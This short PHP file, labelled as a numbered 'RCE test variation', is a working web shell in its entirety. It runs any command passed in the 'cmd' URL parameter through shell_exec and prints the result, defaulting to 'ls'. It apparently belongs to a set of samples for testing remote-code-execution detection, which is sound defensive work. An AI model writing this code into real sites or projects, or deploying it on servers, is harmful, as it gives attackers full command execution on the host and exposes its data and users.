<?php
// RCE test variation #914
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>